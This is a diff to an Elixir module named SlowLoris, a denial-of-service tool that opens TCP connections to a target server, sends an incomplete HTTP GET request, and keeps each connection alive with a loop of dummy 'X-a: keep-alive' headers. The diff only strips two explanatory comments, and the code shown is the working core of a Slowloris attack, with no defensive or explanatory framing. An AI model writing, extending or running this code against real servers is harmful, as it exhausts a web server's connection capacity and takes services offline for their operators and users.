@@ -9,7 +9,6 @@ defmodule SlowLoris do
   defp hold_connection(target, port, interval_ms) do
     case :gen_tcp.connect(String.to_charlist(target), port, [:binary, packet: :raw, active: false]) do
       {:ok, socket} ->
-        # Send an incomplete HTTP request
         :gen_tcp.send(socket, "GET / HTTP/1.1\r\n")
         :gen_tcp.send(socket, "Host: #{target}\r\n")
 
@@ -26,7 +25,7 @@ defmodule SlowLoris do
 
     case :gen_tcp.send(socket, "X-a: keep-alive\r\n") do
       :ok -> loop_send_headers(socket, interval_ms)
-      {:error, _} -> :ok  # connection closed, stop the loop
+      {:error, _} -> :ok
     end
   end
 end
